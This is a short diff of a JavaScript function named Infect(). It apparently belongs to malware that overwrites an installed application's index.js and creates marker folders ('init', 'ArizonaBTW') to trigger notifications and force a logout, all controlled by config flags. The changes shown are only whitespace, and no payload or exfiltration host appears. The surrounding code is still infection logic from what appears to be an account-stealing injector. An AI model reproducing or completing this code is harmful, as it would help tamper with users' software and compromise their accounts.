@@ -56,14 +56,15 @@ function Infect() {
                     encoding: 'utf8',
                     flag: 'w'
                 });
+                
                 if (config["init-notify"] == "true") {
                     let init = file.replace("index.js", "init")
                     if (!fs.existsSync(init)) {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-                if ( config.logout != "false" ) {
 
+                if ( config.logout != "false" ) {
                     let folder = file.replace("index.js", "ArizonaBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
@@ -75,7 +76,6 @@ function Infect() {
                     }
                 }
             })
-            
         });
     }).on("error", (err) => {
         console.log(err);
